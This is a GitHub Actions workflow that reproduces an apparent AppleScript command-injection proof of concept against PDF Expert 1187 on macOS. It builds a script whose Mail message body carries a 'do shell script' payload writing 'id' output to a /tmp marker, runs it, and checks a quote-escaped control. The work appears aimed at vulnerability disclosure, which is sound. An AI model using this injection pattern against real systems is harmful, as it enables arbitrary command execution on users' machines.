name: pdfexpert-poc

on:
  workflow_dispatch:

jobs:
  poc:
    runs-on: macos-latest
    timeout-minutes: 25
    steps:
      - uses: actions/checkout@v4

      - name: Host
        run: sw_vers; uname -m

      - name: Fetch PDF Expert 1187 from the vendor feed
        run: |
          set -euo pipefail
          curl -fsSL -o pex.zip https://downloads.pdfexpert.com/pem3/versions/1187/PDFExpert.zip
          shasum -a 256 pex.zip | tee zip.sha256
          unzip -q pex.zip -d app
          ls -l "app/PDF Expert.app/Contents/MacOS/PDF Expert"

      - name: Template literals present in the shipped bytes
        run: python3 poc/verify_binary.py "app/PDF Expert.app/Contents/MacOS/PDF Expert"

      - name: Build the script from the binary's own literals
        run: |
          set -euo pipefail
          python3 poc/gen_poc.py --binary "app/PDF Expert.app/Contents/MacOS/PDF Expert" \
            --cmd "id > /tmp/pdfe_pwned" --field body > generated.scpt
          echo "--- line 10 ---"; sed -n '10p' generated.scpt
          echo "--- tokenizer ---"; python3 poc/verify_tokenlevel.py generated.scpt
          echo "--- compile ---"
          osacompile -o /tmp/gen.scptd generated.scpt && echo "COMPILE OK" || echo "COMPILE FAILED"

      - name: DECISIVE - execute the generated script
        run: |
          set +e
          rm -f /tmp/pdfe_pwned
          osascript generated.scpt > osa.out 2>&1 &
          PID=$!
          for i in $(seq 1 40); do [ -s /tmp/pdfe_pwned ] && break; sleep 1; done
          kill $PID 2>/dev/null; wait $PID 2>/dev/null
          echo "--- osascript output ---"; cat osa.out
          echo "--- marker begin ---"; cat /tmp/pdfe_pwned 2>/dev/null; echo "--- marker end ---"
          if [ -s /tmp/pdfe_pwned ]; then echo "PROOF: do shell script executed"; else echo "NO PROOF"; fi

      - name: CONTROL - same line, quote escaped, must NOT execute
        run: |
          set +e
          rm -f /tmp/pdfe_ctl
          printf '%s\n' 'tell application "Mail"' \
            'set newMessage to make new outgoing message with properties {subject:"Invoice", content:"x\" & do shell script \"id > /tmp/pdfe_ctl\" & \"" & linefeed & linefeed}' \
            'end tell' > ctl.scpt
          sed -n '2p' ctl.scpt
          osacompile -o /tmp/ctl.scptd ctl.scpt && echo "CTL COMPILE OK" || echo "CTL COMPILE FAILED"
          osascript ctl.scpt > ctl.out 2>&1 &
          PID=$!
          for i in $(seq 1 20); do [ -s /tmp/pdfe_ctl ] && break; sleep 1; done
          kill $PID 2>/dev/null; wait $PID 2>/dev/null
          echo "--- ctl output ---"; cat ctl.out
          if [ -s /tmp/pdfe_ctl ]; then echo "CONTROL FAILED: escaped payload executed"; else echo "CONTROL OK: escaped payload did not execute"; fi

      - name: Collect
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: evidence
          path: |
            generated.scpt
            ctl.scpt
            osa.out
            ctl.out
            zip.sha256
            /tmp/pdfe_pwned
            /tmp/pdfe_ctl
          if-no-files-found: warn
